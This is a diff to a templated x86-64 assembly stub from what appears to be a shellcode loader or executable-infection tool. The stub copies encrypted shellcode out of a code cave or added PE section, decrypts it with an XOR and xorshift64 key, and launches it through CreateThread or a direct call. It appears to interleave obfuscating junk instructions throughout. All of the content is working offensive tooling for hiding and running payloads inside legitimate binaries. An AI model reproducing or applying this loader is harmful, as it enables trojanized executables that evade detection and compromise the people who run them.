@@ -318,86 +318,94 @@ entry:
 
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
-  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}                     {{igi}}
-  mov {{.RegN.rdi}}, [rsp+0x08]                                {{igi}}
-  add {{.RegN.rdi}}, {{hex .EntryOffset}}                      {{igi}}
+  push {{.RegN.rdi}}                           {{igi}} // save "rdi"
+  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
+  mov {{.RegN.rdi}}, [rsp+0x10]                {{igi}} // address of allocated memory page
+  add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
+  pop {{.RegN.rdi}}                            {{igi}} // restore "rdi"
 {{end}} // CodeCave
 
 {{if or .ExtendSection .CreateSection}}
   // save rsi and rdi
-  push rsi                                                     {{igi}}
-  push rdi                                                     {{igi}}
+  push rsi                                     {{igi}}
+  push rdi                                     {{igi}}
 
   // extract encrypted shellcode from section
-  mov rsi, {{.RegN.rdi}}                                       {{igi}}
-  add rsi, {{hex .ShellcodeOffset}}                            {{igi}}
-  mov rdi, [rsp+0x18]                                          {{igi}}
-  add rdi, {{hex .EntryOffset}}                                {{igi}}
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
+  mov rsi, {{.RegN.rdi}}                       {{igi}} // address of image base
+  add rsi, {{hex .ShellcodeOffset}}            {{igi}} // address of encrypted shellcode
+  mov rdi, [rsp+0x18]                          {{igi}} // address of allocated memory page
+  add rdi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
  loop_extract:
-  movsb                                                        {{igi}}
-  inc rsi                                                      {{igi}}
+  movsb                                        {{igi}}
+  inc rsi                                      {{igi}}
   // check extract shellcode is finish
-  dec {{.RegV.rcx}}                                            {{igi}}
-  jnz loop_extract                                             {{igi}}
+  dec {{.RegV.rcx}}                            {{igi}}
+  jnz loop_extract                             {{igi}}
 
   // restore rdi and rsi
-  pop rdi                                                      {{igi}}
-  pop rsi                                                      {{igi}}
+  pop rdi                                      {{igi}}
+  pop rsi                                      {{igi}}
 
   // decrypt shellcode in the memory page
-  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}                     {{igi}}
-  mov {{.RegV.rdx}}, [rsp+0x08]                                {{igi}}
-  add {{.RegV.rdx}}, {{hex .EntryOffset}}                      {{igi}}
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
+  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
+  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of allocated memory page
+  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
  loop_decrypt:
-  mov {{.RegV.r8}}, [{{.RegV.rdx}}]                            {{igi}}
-  xor {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
-  mov [{{.RegV.rdx}}], {{.RegV.r8}}                            {{igi}}
+  mov {{.RegV.r8}}, [{{.RegV.rdx}}]            {{igi}}
+  xor {{.RegV.r8}}, {{.RegV.rax}}              {{igi}}
+  mov [{{.RegV.rdx}}], {{.RegV.r8}}            {{igi}}
   // update the key with xorshift64
-  call xor_shift                                               {{igi}}
+  call xor_shift                               {{igi}}
   // check decrypt shellcode is finish
-  add {{.RegV.rdx}}, 8                                         {{igi}}
-  sub {{.RegV.rcx}}, 8                                         {{igi}}
-  jnz loop_decrypt                                             {{igi}}
+  add {{.RegV.rdx}}, 8                         {{igi}}
+  sub {{.RegV.rcx}}, 8                         {{igi}}
+  jnz loop_decrypt                             {{igi}}
 {{end}} // SectionMode
 
 // ================================== execute shellcode ==================================
 
 {{if .NeedCreateThread}}
-  mov rax, [rsp+0x28]            {{igi}} // address of CreateThread
-  mov r10, [rsp+0x08]            {{igi}} // address of memory page
-  add r10, {{hex .EntryOffset}}  {{igi}} // address of shellcode
+  {{if .NeedJumper}}
+    mov r10, {{.RegN.rdi}}                     {{igi}} // address of image base
+    add r10, {{hex .JumperOffset}}             {{igi}} // address of jumper
+    mov r11, [rsp+0x08]                        {{igi}} // address of memory page
+    add r11, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+  {{else}}
+    mov r10, [rsp+0x08]                        {{igi}} // address of memory page
+    add r10, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+  {{end}}
 
-  sub rsp, 0x10                  {{igi}} // reserve stack for argument
-  xor rcx, rcx                   {{igi}} // lpThreadAttributes
-  xor rdx, rdx                   {{igi}} // dwStackSize
-  mov r8, r10                    {{igi}} // lpStartAddress
-  xor r9, r9                     {{igi}} // lpParameter
-  mov [rsp+0], rcx               {{igi}} // dwCreationFlags
-  mov [rsp+8], rcx               {{igi}} // lpThreadId
-  sub rsp, 0x20                  {{igi}} // reserve stack for call convention
-  call rax                       {{igi}} // call CreateThread
-  add rsp, 0x20                  {{igi}} // restore stack for call convention
-  add rsp, 0x10                  {{igi}} // restore stack for argument
+  mov rax, [rsp+0x28]                          {{igi}} // address of CreateThread
+
+  sub rsp, 0x10                                {{igi}} // reserve stack for argument
+  xor rcx, rcx                                 {{igi}} // lpThreadAttributes
+  xor rdx, rdx                                 {{igi}} // dwStackSize
+  mov r8, r10                                  {{igi}} // lpStartAddress
+  mov r9, r11                                  {{igi}} // lpParameter
+  mov [rsp+0], rcx                             {{igi}} // dwCreationFlags
+  mov [rsp+8], rcx                             {{igi}} // lpThreadId
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call CreateThread
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
+  add rsp, 0x10                                {{igi}} // restore stack for argument
 
   {{if .NeedWaitThread}}
-    mov rcx, rax                 {{igi}} // hHandle, hThread
-    mov rdx, 0xFFFFFFFF          {{igi}} // dwMilliseconds, INFINITE
-    mov rax, [rsp+0x30]          {{igi}} // address of WaitForSingleObject
-    sub rsp, 0x20                {{igi}} // reserve stack for call convention
-    call rax                     {{igi}} // call WaitForSingleObject
-    add rsp, 0x20                {{igi}} // restore stack for call convention
+    mov rcx, rax                               {{igi}} // hHandle, hThread
+    mov rdx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
+    mov rax, [rsp+0x30]                        {{igi}} // address of WaitForSingleObject
+    sub rsp, 0x20                              {{igi}} // reserve stack for call convention
+    call rax                                   {{igi}} // call WaitForSingleObject
+    add rsp, 0x20                              {{igi}} // restore stack for call convention
   {{end}}
 {{else}}
-  // get the shellcode entry point
-  mov {{.RegV.rax}}, [rsp+0x08]                                {{igi}}
-  add {{.RegV.rax}}, {{hex .EntryOffset}}                      {{igi}}
-  // call the shellcode
-  sub rsp, 0x20                                                {{igi}}
-  call {{.RegV.rax}}                                           {{igi}}
-  add rsp, 0x20                                                {{igi}}
+  mov {{.RegV.rax}}, [rsp+0x08]                {{igi}} // address of allocated memory
+  add {{.RegV.rax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call {{.RegV.rax}}                           {{igi}} // call shellcode
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
 {{end}}
 
 // =================================== erase shellcode ===================================
